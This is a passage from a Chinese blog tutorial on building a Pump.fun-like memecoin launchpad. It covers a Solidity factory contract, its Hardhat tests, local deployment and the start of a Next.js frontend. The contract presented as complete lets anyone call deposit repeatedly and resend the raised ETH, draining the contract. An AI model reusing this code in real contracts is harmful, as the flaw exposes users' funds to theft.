&#125;)</span><br></pre></td></tr></table></figure><p>对于<code>buyTokenFixture</code>函数：</p><p>该函数部署一个合约，并使用<code>buyer</code>用户购买<code>token</code>，输入购买的数量<code>AMOUNT</code>和转入的费用<code>COST</code>，完成<code>token</code>的购买。</p><p>购买逻辑部分测试：</p><p>（1）核对购买<code>token</code>后的合约资金</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; factory &#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line"><span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line"><span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">FEE</span> + <span class="variable constant_">COST</span>);</span><br></pre></td></tr></table></figure><p><code>ethers.provider.getBalance</code>获取合约的资金数量，判断是否等于<code>FEE + COST</code>。创建<code>token</code>转入<code>factory</code>合约<code>FEE</code>，购买<code>token</code>又花费了<code>COST</code>，最后合约的资金为<code>FEE + COST</code>。</p><p>（2）核对<code>buyer</code>的<code>token</code>数量是否正确，见代码。</p><p>（3）核对<code>token</code>的售卖信息，见代码。</p><p>（4）核对销售的价格是否符合逻辑。基本单位为<code>ether</code>，<code>1 ether</code> 等于<code>1后面18个0</code>。销售的数量为<code>10000 ether</code>，带入到<code>getCost</code>函数可得，购买的价格应该为<code>0.0002</code> ETH。</p><h3 id="Deposit函数-资金管理">Deposit函数(资金管理)</h3><h4 id="函数代码-3">函数代码</h4><p>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function deposit(address _token) external&#123;</span><br><span class="line">    //代币销售结束后资金结算的逻辑</span><br><span class="line">    //剩余的tokens 和 ETH转给creator</span><br><span class="line">    Token token = Token(_token);</span><br><span class="line">    TokenSale memory sale = tokenToSale[_token];</span><br><span class="line"></span><br><span class="line">    require(sale.isOpen == false,&quot;Factory: Target not reached&quot;);</span><br><span class="line"></span><br><span class="line">    //将Factory合约持有的代币转移给creator</span><br><span class="line">    token.transfer(sale.creator, token.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">    //将筹集的ETH全部转移creator</span><br><span class="line">    (bool success,) = payable(sale.creator).call&#123;value: sale.raised&#125;(&quot;&quot;);</span><br><span class="line">    require(success,&quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数是<code>external</code>的，只能从合约的外部调用，其主要功能为<code>token</code>销售结束后的资金结算。</p><p>函数传入的参数为<code>_token</code>，即<code>token</code>的地址。利用<code>token</code>的地址获取到<code>token</code>的销售信息，只有当<code>token</code>达到销售的预期后才进行资金的清算，即代码中的<code>sale.isOpen == false</code>。然后将<code>factory</code>合约持有的<code>token</code>全部转给<code>creator</code>。最后再把<code>factory</code>筹集的<code>ETH</code>也全部转给<code>creator</code>。</p><h4 id="合约测试-3">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Depositing&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;2&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Sale should be closed and successful deposits&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; factory, token, creator, buyer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Buy tokens again to reach the target</span></span><br><span class="line">        <span class="keyword">const</span> buyTx = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(buyer).<span class="title function_">buy</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>(), <span class="variable constant_">AMOUNT</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">COST</span>&#125;);</span><br><span class="line">        <span class="keyword">await</span> buyTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">        <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> depositTx = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(creator).<span class="title function_">deposit</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">        <span class="keyword">await</span> depositTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> balance = <span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(creator.<span class="property">address</span>);</span><br><span class="line">        <span class="comment">//console.log(balance);</span></span><br><span class="line">        <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;980000&quot;</span>,<span class="number">18</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于存款逻辑测试：</p><p>（1）调用<code>loadFixture(buyTokenFixture);</code>函数获取相关用户和<code>token</code>。注意这里是调用了<code>buyTokenFixture</code>，在<code>buyTokenFixture</code>函数中<code>buyer</code>已经购买了<code>10000 ether</code>的<code>token</code>，并向<code>factory</code>合约中转入了<code>1 ether</code>。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217130455947.png" alt="image-20250217130455947"></p><p>（2）在此<code>Depositing</code>测试中<code>buyer</code>又再次购买了<code>10000 ether</code>的<code>token</code>，并向合约中转入了<code>2 ether</code>。</p><p>（3）检查<code>token</code>的销售信息。因为先后向<code>factory</code>合约中一共转入了<code>3 ether</code>，达到了目标，<code>sale.isOpen</code>被赋值了<code>false</code>。所以测试中，<code>sale.isOpen</code>是为<code>false</code>的。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217131220117.png" alt="image-20250217131220117"></p><p>（4）达到<code>token</code>的售卖目标后，将<code>factory</code>剩余的<code>token</code>全部转移为<code>creator</code>。因为一共购买了<code>20000 ether</code>，一共铸造了<code>1000000 ether</code>的<code>token</code>，故转移给<code>creator</code>的<code>token</code>的数量应该为<code>980000 ether</code>。所以测试中<code>creator</code>的<code>token</code>数量为<code>980000 ether</code>。</p><h3 id="Withdraw函数-合约资金回撤">Withdraw函数(合约资金回撤)</h3><h4 id="函数代码-4">函数代码</h4><p>代码详细如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) external&#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Factory: Not Owner&quot;);</span><br><span class="line"></span><br><span class="line">    (bool success, ) = payable(owner).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Factory: ETH transfer failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约函数传入的参数为<code>_amount</code>，即要转移的资金数量，其功能是将一定数量的合约资金转给合约的拥有者<code>owner</code>。</p><p>首先，判断<code>msg.sender</code>是否为<code>owner</code>，即调用<code>withdraw</code>合约函数的地址是否为<code>owner</code>。只有合约的<code>owner</code>才能管理合约中的资金。该函数的第一步即验证权限，确定要为<code>owner</code>。确认<code>owner</code>的身份后，调用转账函数，将合约的<code>_amount</code>数量的资金转移给<code>owner</code>。</p><h4 id="合约测试-4">合约测试</h4><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Withdrawing Fee&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//部署合约，提交了FEE</span></span><br><span class="line">    <span class="comment">//然后再将FEE进行撤回</span></span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balances&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; factory, deployer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(deployer).<span class="title function_">withdraw</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>合约资金回撤测试：</p><p>（1）首先，<code>deployer</code>调用<code>loadFixture(deployFactoryFixture)</code>函数进行<code>factory</code>合约的部署，合约部署时，会创建第一个<code>token</code>，并转入创建的<code>FEE</code>。此时<code>factory</code>合约的<code>owner</code>为<code>deployer</code>，<code>factory</code>合约的资金数为<code>FEE</code>。</p><p>（2）<code>deployer</code>调用<code>factory</code>合约的<code>withdraw</code>函数进行合约资金的回撤。</p><p>（3）最后测试，回撤资金成功后，<code>factory</code>合约的资金变为0。</p><h3 id="完整合约代码">完整合约代码</h3><p>完整的<code>Factory.sol</code>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.27;</span><br><span class="line"></span><br><span class="line">import &#123;Token&#125; from &quot;./Token.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    uint256 public constant TARGET = 3 ether;</span><br><span class="line">    uint256 public constant TOKEN_LIMIT = 500_000 ether;</span><br><span class="line">    //交易费费用</span><br><span class="line">    uint256 public immutable fee;</span><br><span class="line">    //合约的部署者</span><br><span class="line">    address public owner;</span><br><span class="line">    //token数组</span><br><span class="line">    address[] public tokens;</span><br><span class="line">    //token总共的数量</span><br><span class="line">    uint256 public totalTokens;</span><br><span class="line"></span><br><span class="line">    //将token的地址映射到token售卖信息的结构体上</span><br><span class="line">    mapping(address =&gt; TokenSale) public tokenToSale;</span><br><span class="line">    //创建一个售卖token的结构体</span><br><span class="line">    struct TokenSale&#123;</span><br><span class="line">        address token;</span><br><span class="line">        string name;</span><br><span class="line">        address creator;</span><br><span class="line">        uint256 sold;</span><br><span class="line">        uint256 raised;</span><br><span class="line">        bool isOpen;</span><br><span class="line">    &#125;</span><br><span class="line">    //当创建一个token时，发生了一个Created事件</span><br><span class="line">    event Created(address indexed token);</span><br><span class="line">    //当购买一个token时，发生一个Buy事件</span><br><span class="line">    event Buy(address indexed token, uint256 amount);</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _fee) &#123;</span><br><span class="line">        fee = _fee;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //通过token在token数组中的下标_index，来获取token的售卖信息</span><br><span class="line">    function getTokenSale(uint256 _index) public view returns (TokenSale memory) &#123;</span><br><span class="line">        return tokenToSale[tokens[_index]];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCost(uint256 _sold) public pure returns (uint256)&#123;</span><br><span class="line">        uint256 floor = 0.0001 ether;</span><br><span class="line">        uint256 step = 0.0001 ether;</span><br><span class="line">        uint256 increment = 10000 ether;</span><br><span class="line">        uint256 cost = (step * (_sold / increment)) + floor;</span><br><span class="line">        return cost;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function create(string memory _name, string memory _symbol) external payable &#123;</span><br><span class="line">        //确保创建者的余额大于fee，否则报错不向下继续执行。</span><br><span class="line">        require(msg.value &gt;= fee, &quot;Factory: Creator fee not met&quot;);</span><br><span class="line">        </span><br><span class="line">        //创建一个token</span><br><span class="line">        Token token = new Token(msg.sender, _name, _symbol, 1000000 ether);</span><br><span class="line">        //tokens数组存储token</span><br><span class="line">        tokens.push(address(token));</span><br><span class="line">        //token计数</span><br><span class="line">        totalTokens ++;</span><br><span class="line">        //列出用于售卖的token</span><br><span class="line">        // address token;</span><br><span class="line">        // string name;</span><br><span class="line">        // address creator;</span><br><span class="line">        // uint256 sold;</span><br><span class="line">        // uint256 raised;</span><br><span class="line">        // bool isOpen;</span><br><span class="line">        TokenSale memory sale = TokenSale(address(token),_name,msg.sender,0,0,true);</span><br><span class="line"></span><br><span class="line">        tokenToSale[address(token)] = sale;</span><br><span class="line">        //触发Created事件，通知token被创建了。</span><br><span class="line">        emit Created(address(token));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(address _token, uint256 _amount) external payable&#123;</span><br><span class="line">        TokenSale storage sale = tokenToSale[_token];</span><br><span class="line">        //检查条件</span><br><span class="line">        require(sale.isOpen == true, &quot;Factory: Buying closed&quot;);</span><br><span class="line">        require(_amount &gt;= 1 ether, &quot;Factory: Amount too low&quot;);</span><br><span class="line">        require(_amount &lt;= 10000 ether, &quot;Factory: Amount exceeded&quot;);</span><br><span class="line"></span><br><span class="line">        //计算一个token的价格基于购买的总量</span><br><span class="line">        uint256 cost = getCost(sale.sold);</span><br><span class="line">        uint256 price = cost * (_amount / 10 ** 18);</span><br><span class="line">        //确保足够的ETH发送</span><br><span class="line">        require(msg.value &gt;= price, &quot;Factory: Insufficient ETH received&quot;);</span><br><span class="line">        //更新sale</span><br><span class="line">        sale.sold += _amount;</span><br><span class="line">        sale.raised += price;</span><br><span class="line">        //判断筹集目标是否达成</span><br><span class="line">        if(sale.sold &gt;= TOKEN_LIMIT || sale.raised &gt;= TARGET)&#123;</span><br><span class="line">            //关闭销售</span><br><span class="line">            sale.isOpen = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Token(_token).transfer(msg.sender, _amount);</span><br><span class="line">        //触发Buy事件</span><br><span class="line">        emit Buy(_token, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address _token) external&#123;</span><br><span class="line">        //代币销售结束后资金结算的逻辑</span><br><span class="line"></span><br><span class="line">        //剩下的token余额和增加的ETH</span><br><span class="line">        //会进入像uniswap v3那样的流动性池</span><br><span class="line">        //为了简单起见，我们只转移剩余的部分</span><br><span class="line">        //剩余的tokens 和 ETH转给creator</span><br><span class="line">        Token token = Token(_token);</span><br><span class="line">        TokenSale memory sale = tokenToSale[_token];</span><br><span class="line"></span><br><span class="line">        require(sale.isOpen == false,&quot;Factory: Target not reached&quot;);</span><br><span class="line"></span><br><span class="line">        //将Factory合约持有的代币转移给creator</span><br><span class="line">        token.transfer(sale.creator, token.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        //将筹集的ETH全部转移creator</span><br><span class="line">        (bool success,) = payable(sale.creator).call&#123;value: sale.raised&#125;(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) external&#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Factory: Not Owner&quot;);</span><br><span class="line">        </span><br><span class="line">        (bool success, ) = payable(owner).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="本地部署合约">本地部署合约</h2><p>在<code>/FUN-PUMP/ignition/modules/</code>目录下，创建<code>Factory.js</code>，进行合约的部署，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; buildModule &#125; = <span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-ignition/modules&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FEE</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.01&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">buildModule</span>(<span class="string">&quot;FactoryModule&quot;</span>, <span class="function">(<span class="params">m</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> fee = m.<span class="title function_">getParameter</span>(<span class="string">&quot;fee&quot;</span>, <span class="variable constant_">FEE</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> factory = m.<span class="title function_">contract</span>(<span class="string">&quot;Factory&quot;</span>, [fee]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; factory &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>首先启动本地的区块链。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p>然后，进行合约部署</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat ignition deploy ignition/modules/Factory.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217145430869.png" alt="image-20250217145430869"></p><p>成功部署。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217145456776.png" alt="image-20250217145456776"></p><p>如果已经部署了合约，需要重置合约</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat ignition deploy ignition/modules/Factory.js --network localhost --reset</span><br></pre></td></tr></table></figure><h2 id="前端">前端</h2><p>本地测试，使用<code>next.js</code>渲染前端的界面，前端使用<code>React</code>库用作前端界面展示。前端执行<code>javascript</code>和部署在区块链上的<code>factory</code>合约进行交互，返回结果，前端进行展示。</p><p>启动<code>next.js</code>，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217150831503.png" alt="image-20250217150831503"></p><h3 id="Metamask导入本地用户">Metamask导入本地用户</h3><p>点击添加账户，导入账户。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154415563.png" alt="image-20250217154415563"></p><p>本地区块链启动时，会有几个测试账户，导入私钥即可。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154636893.png" alt="image-20250217154636893"></p><h3 id="连接钱包并加载链上内容">连接钱包并加载链上内容</h3><p>首先将部署合约后的合约地址添加到配置环境中，地址为<code>0x5FbDB2315678afecb367f032d93F642f64180aa3</code>。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151249055.png" alt="image-20250217151249055"></p><p>连接metamask钱包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="title class_">BrowserProvider</span>(<span class="variable language_">window</span>.<span class="property">ethereum</span>);</span><br><span class="line"><span class="title function_">setProvider</span>(provider);</span><br></pre></td></tr></table></figure><p>获取网络和合约的地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> network = <span class="keyword">await</span> provider.<span class="title function_">getNetwork</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;chainId:&quot;</span>,network.<span class="property">chainId</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>, config[network.<span class="property">chainId</span>].<span class="property">factory</span>.<span class="property">address</span>);</span><br><span class="line"><span class="comment">//address,abi,signerOrProvider</span></span><br><span class="line"><span class="keyword">const</span> factory = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(config[network.<span class="property">chainId</span>].<span class="property">factory</span>.<span class="property">address</span>,<span class="title class_">Factory</span>,provider);</span><br><span class="line"><span class="title function_">setFactory</span>(factory);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;factory:&quot;</span>,factory);</span><br><span class="line"><span class="keyword">const</span> fee = <span class="keyword">await</span> factory.<span class="title function_">fee</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fee:&quot;</span>,fee);</span><br><span class="line"><span class="title function_">setFee</span>(fee);</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151435573.png" alt="image-20250217151435573"></p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151912945.png" alt="image-20250217151912945"></p><p>在页面第一次加载时，自动执行<code>loadBlockchainData</code>函数，加载钱包。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">loadBlockchainData</span>();</span><br><span class="line">&#125;,[])</span><br></pre></td></tr></table></figure><h3 id="创建Token-2">创建Token</h3><p>在<code>List.js</code>中，编写一个表单提交，输入<code>token</code>的名称和符号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">listHandler</span>(<span class="params">form</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> name = form.<span class="title function_">get</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> ticker = form.<span class="title function_">get</span>(<span class="string">&quot;ticker&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(signer).<span class="title function_">create</span>(name, ticker, &#123;<span class="attr">value</span>: fee&#125;);</span><br><span class="line">    <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    